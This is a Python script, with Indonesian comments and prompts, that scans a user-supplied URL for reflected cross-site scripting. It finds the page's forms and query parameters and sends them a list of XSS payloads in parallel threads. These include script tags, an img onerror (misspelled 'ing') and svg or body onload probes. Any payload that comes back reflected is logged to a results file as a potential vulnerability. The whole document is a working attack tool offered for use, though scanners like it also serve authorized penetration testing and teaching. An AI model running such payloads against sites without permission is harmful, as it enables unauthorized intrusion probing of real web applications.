import requests
from bs4 import BeautifulSoup
import threading
from urllib.parse import urlparse, parse_qs, urlencode

url = input("Masukkan URL target (contoh: http://localhost/login atau /search?q=): ")
output_file = "multithreaded_xss_results.txt"

# Payload XSS sederhana
payloads = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<ing src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
]

results = []
lock = threading.Lock()

# Ambil semua form
try:
    r = requests.get(url)
    soup = BeautifulSoup(r.text, "html.parser")
    forms = soup.find_all("form")
    print(f"Ditemukan {len(forms)} form di {url}")
except Exception as e:
    print(f"Error saat ambil halaman: {e}")
    forms = []

def test_form_xss(form, payload):
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all("input")
    data = {}
    for i in inputs:
        name = i.get("name")
        if name:
            data[name] = payload
    target_url = action if action and action.startswith("http") else url
    try:
        if method == "post":
            res = requests.post(target_url, data=data)
        else:
            res = requests.get(target_url, params=data)
        if payload in res.text:
            msg = f"Potensi XSS di {target_url} dengan payload: {payload}"
            print(msg)
            with lock:
                results.append(msg)
        else:
            print(f"Tidak rentan: {target_url} dengan payload {payload}")
    except Exception as e:
        print(f"Error: {e}")

def test_url_param_xss(url, payload):
    parsed = urlparse(url)
    if not parsed.query:
        return
    qs = parse_qs(parsed.query)
    for key in qs:
        qs[key] = payload
    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs, doseq=True)}"
    try:
        res = requests.get(test_url)
        if payload in res.text:
            msg = f"Potensi XSS di {test_url} dengan payload: {payload}"
            print(msg)
            with lock:
                results.append(msg)
        else:
            print(f"Tidak rentan: {test_url} dengan payload {payload}")
    except Exception as e:
        print(f"Error: {e}")

threads = []

# Thread untuk form
for f in forms:
    for p in payloads:
        t = threading.Thread(target=test_form_xss, args=(f, p))
        threads.append(t)
        t.start()

# Thread untuk URL param
for p in payloads:
    t = threading.Thread(target=test_url_param_xss, args=(url, p))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

with open(output_file, "w") as f:
    if results:
        for r in results:
            f.write(r + "\n")
    else:
        f.write("Tidak ditemukan kerentanan XSS.\n")

print(f"\nSemua hasil tersimpan di {output_file}")
